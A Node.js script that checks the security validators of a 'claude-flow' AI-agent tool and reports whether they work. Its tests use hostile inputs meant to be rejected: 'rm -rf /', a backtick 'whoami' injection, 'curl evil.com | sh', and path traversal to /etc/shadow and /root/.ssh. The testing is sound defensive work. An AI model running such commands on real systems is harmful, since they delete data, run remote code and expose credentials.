#!/usr/bin/env node
/**
 * Security Module Verification Script for Claude Code
 *
 * This script demonstrates how to verify all security modules
 * are properly integrated and functional in Claude Code context.
 *
 * Usage: npx tsx scripts/verify-security-integration.mjs
 */

import { fileURLToPath } from 'url';
import { dirname, join } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Change to project root
process.chdir(join(__dirname, '..', '..'));

import { validateIdentifier, validatePath, validateText } from '../../cli-core/src/mcp-tools/validate-input.ts';

// ============================================================
// PART 1: Verify @claude-flow/security modules are loaded
// ============================================================

async function verifySecurityPackage() {
  console.log('\n📦 Part 1: Verify @claude-flow/security package\n');
  console.log('─'.repeat(50));

  let securityAvailable = false;
  let modules = {};

  try {
    // Try to import @claude-flow/security
    const security = await import('@claude-flow/security');
    securityAvailable = true;
    modules = {
      'InputValidator': typeof security.InputValidator === 'function',
      'PathValidator': typeof security.PathValidator === 'function',
      'SafeExecutor': typeof security.SafeExecutor === 'function',
      'PasswordHasher': typeof security.PasswordHasher === 'function',
      'TokenGenerator': typeof security.TokenGenerator === 'function',
      'CredentialGenerator': typeof security.CredentialGenerator === 'function',
      'SecureHttpClient': typeof security.SecureHttpClient === 'function',
    };

    console.log('✅ @claude-flow/security loaded successfully');
    console.log('   Available modules:');
    for (const [name, available] of Object.entries(modules)) {
      console.log(`   - ${name}: ${available ? '✅' : '⚠️  (not exported)'}`);
    }
  } catch (e) {
    console.log('⚠️  @claude-flow/security not installed as package');
    console.log('   Using inline validators from cli-core/mcp-tools');
    console.log('   Install with: npm install @claude-flow/security');
  }

  return securityAvailable;
}

// ============================================================
// PART 2: Verify CLI input validation integration
// ============================================================

async function verifyCliInputValidation() {
  console.log('\n📦 Part 2: Verify CLI Input Validation Integration\n');
  console.log('─'.repeat(50));

  const tests = [
    // Valid inputs
    { input: 'my-agent-123', fn: validateIdentifier, label: 'valid agent ID' },
    { input: 'namespace:type', fn: validateIdentifier, label: 'namespaced ID' },
    { input: '/project/src/index.ts', fn: validatePath, label: 'valid file path' },

    // Attack vectors - should be rejected
    { input: 'test; rm -rf /', fn: validateIdentifier, label: 'shell injection (semicolon)', expectReject: true },
    { input: 'test`whoami`', fn: validateIdentifier, label: 'shell injection (backtick)', expectReject: true },
    { input: '/etc/../../../passwd', fn: validatePath, label: 'path traversal', expectReject: true },
  ];

  let passed = 0;
  let failed = 0;

  for (const test of tests) {
    const result = test.fn(test.input, 'test');
    const shouldReject = test.expectReject === true;

    if (shouldReject && !result.valid) {
      console.log(`✅ ${test.label} - correctly rejected`);
      passed++;
    } else if (!shouldReject && result.valid) {
      console.log(`✅ ${test.label} - correctly accepted`);
      passed++;
    } else {
      console.log(`❌ ${test.label} - unexpected result: ${JSON.stringify(result)}`);
      failed++;
    }
  }

  console.log(`\n   Result: ${passed} passed, ${failed} failed`);
  return failed === 0;
}

// ============================================================
// PART 3: Verify MCP tools security integration
// ============================================================

async function verifyMcpToolsSecurity() {
  console.log('\n📦 Part 3: Verify MCP Tools Security Integration\n');
  console.log('─'.repeat(50));

  // Check that MCP tools import validation
  const fs = await import('fs');
  const cliCorePath = join(__dirname, '..', '..', 'cli-core', 'src', 'mcp-tools', 'validate-input.ts');
  const cliPath = join(__dirname, '..', 'src', 'mcp-tools', 'validate-input.ts');

  console.log('Checking MCP tools integration...\n');

  // Check cli-core validates
  const validateInput = fs.readFileSync(cliCorePath, 'utf-8');
  const hasSecurityIntegration = validateInput.includes('@claude-flow/security');

  console.log(`✅ cli-core/mcp-tools/validate-input.ts exists`);
  console.log(`   - validateIdentifier: ${validateInput.includes('validateIdentifier') ? '✅' : '❌'}`);
  console.log(`   - validatePath: ${validateInput.includes('validatePath') ? '✅' : '❌'}`);
  console.log(`   - validateText: ${validateInput.includes('validateText') ? '✅' : '❌'}`);
  console.log(`   - Shell metachar detection: ${validateInput.includes('SHELL_META') ? '✅' : '❌'}`);
  console.log(`   - Path traversal detection: ${validateInput.includes('PATH_TRAVERSAL') ? '✅' : '❌'}`);

  // Check CLI re-exports
  const cliValidateInput = join(__dirname, '..', 'src', 'mcp-tools', 'validate-input.ts');
  if (fs.existsSync(cliValidateInput)) {
    const cliContent = fs.readFileSync(cliValidateInput, 'utf-8');
    if (cliContent.includes("export * from '@claude-flow/cli-core")) {
      console.log(`✅ cli/mcp-tools/validate-input.ts re-exports cli-core (DRY)`);
    }
  }

  return true;
}

// ============================================================
// PART 4: Verify AIDefence integration
// ============================================================

async function verifyAIDefence() {
  console.log('\n📦 Part 4: Verify AIDefence Integration\n');
  console.log('─'.repeat(50));

  let aidefenceAvailable = false;

  try {
    const aidefence = await import('@claude-flow/aidefence');
    aidefenceAvailable = true;
    console.log('✅ @claude-flow/aidefence loaded');

    const instance = aidefence.createAIDefence({ enableLearning: true });
    console.log('   - createAIDefence: ✅');
    console.log('   - Learning enabled: ✅');
  } catch (e) {
    console.log('⚠️  @claude-flow/aidefence not installed');
    console.log('   Install with: npm install @claude-flow/aidefence');
  }

  // Check security-tools.ts imports it
  const fs = await import('fs');
  const securityTools = join(__dirname, '..', 'src', 'mcp-tools', 'security-tools.ts');
  if (fs.existsSync(securityTools)) {
    const content = fs.readFileSync(securityTools, 'utf-8');
    if (content.includes('@claude-flow/aidefence')) {
      console.log('✅ MCP tools import AIDefence');
    }
  }

  return aidefenceAvailable;
}

// ============================================================
// PART 5: Run security regression checker
// ============================================================

async function verifySecurityRegression() {
  console.log('\n📦 Part 5: Verify Security Regression Checker\n');
  console.log('─'.repeat(50));

  const fs = await import('fs');
  const regressionPath = join(__dirname, '../../../testing/src/regression/security-regression.ts');

  if (!fs.existsSync(regressionPath)) {
    console.log('⚠️  Security regression checker not found');
    return false;
  }

  console.log('✅ Security regression checker exists');
  console.log('   Checking for common vulnerability patterns...\n');

  // Check for pattern definitions
  const content = fs.readFileSync(regressionPath, 'utf-8');
  const patterns = [
    { name: 'SQL Injection', pattern: 'sql-injection' },
    { name: 'Command Injection', pattern: 'command-injection' },
    { name: 'Path Traversal', pattern: 'path-traversal' },
    { name: 'Weak Random', pattern: 'weak-random' },
    { name: 'Hardcoded Secret', pattern: 'hardcoded-secret' },
  ];

  for (const p of patterns) {
    const found = content.includes(p.pattern);
    console.log(`   ${found ? '✅' : '⚠️ '} ${p.name}: ${found ? 'detected' : 'not defined'}`);
  }

  return true;
}

// ============================================================
// PART 6: Integration test - simulate Claude Code usage
// ============================================================

async function simulateClaudeCodeUsage() {
  console.log('\n📦 Part 6: Simulate Claude Code Usage\n');
  console.log('─'.repeat(50));

  console.log('Simulating typical Claude Code security scenarios...\n');

  const scenarios = [
    {
      name: 'Agent spawn with malicious ID',
      action: () => validateIdentifier('agent; curl evil.com | sh', 'agentId'),
      expectReject: true,
    },
    {
      name: 'Memory store with path traversal',
      action: () => validatePath('../../../etc/shadow', 'key'),
      expectReject: true,
    },
    {
      name: 'Valid agent spawn',
      action: () => validateIdentifier('my-coder-001', 'agentId'),
      expectReject: false,
    },
    {
      name: 'Valid memory key',
      action: () => validateText('my-pattern-v1', 'key'),
      expectReject: false,
    },
    {
      name: 'File path with traversal',
      action: () => validatePath('src/../../../root/.ssh', 'path'),
      expectReject: true,
    },
  ];

  let passed = 0;
  let failed = 0;

  for (const scenario of scenarios) {
    const result = scenario.action();
    const blocked = !result.valid;

    if (scenario.expectReject && blocked) {
      console.log(`✅ ${scenario.name} - blocked as expected`);
      passed++;
    } else if (!scenario.expectReject && !blocked) {
      console.log(`✅ ${scenario.name} - allowed as expected`);
      passed++;
    } else {
      console.log(`❌ ${scenario.name} - unexpected result`);
      failed++;
    }
  }

  console.log(`\n   Claude Code simulation: ${passed} passed, ${failed} failed`);
  return failed === 0;
}

// ============================================================
// Main
// ============================================================

async function main() {
  console.log('═'.repeat(60));
  console.log('  Security Module Verification for Claude Code');
  console.log('═'.repeat(60));
  console.log('\n📅 Verification Date:', new Date().toISOString());
  console.log('📁 Working Directory:', process.cwd());

  const results = [];

  // Run all verification parts
  results.push(await verifySecurityPackage());
  results.push(await verifyCliInputValidation());
  results.push(await verifyMcpToolsSecurity());
  results.push(await verifyAIDefence());
  results.push(await verifySecurityRegression());
  results.push(await simulateClaudeCodeUsage());

  // Summary
  console.log('\n' + '═'.repeat(60));
  console.log('  VERIFICATION SUMMARY');
  console.log('═'.repeat(60));

  console.log('\n✅ Security Module Integration Status:');
  console.log(`   - @claude-flow/security package: ${results[0] ? '✅ Installed' : '⚠️  Inline only'}`);
  console.log(`   - CLI Input Validation: ${results[1] ? '✅ Working' : '❌ Failed'}`);
  console.log(`   - MCP Tools Integration: ${results[2] ? '✅ Verified' : '❌ Failed'}`);
  console.log(`   - AIDefence Integration: ${results[3] ? '✅ Available' : '⚠️  Not installed'}`);
  console.log(`   - Security Regression: ${results[4] ? '✅ Enabled' : '❌ Missing'}`);
  console.log(`   - Claude Code Simulation: ${results[5] ? '✅ Passed' : '❌ Failed'}`);

  const allPassed = results.filter(r => r === false).length === 0;
  console.log('\n' + '═'.repeat(60));
  if (allPassed) {
    console.log('🎉 All security verifications passed!');
    console.log('\nYou can now use Claude Code with confidence that:');
    console.log('  • Shell injection attacks are blocked');
    console.log('  • Path traversal is prevented');
    console.log('  • AIDefence monitors AI manipulation attempts');
    console.log('  • All MCP tools validate input');
  } else {
    console.log('⚠️  Some verifications failed. Review the output above.');
  }
  console.log('═'.repeat(60) + '\n');
}

main().catch(console.error);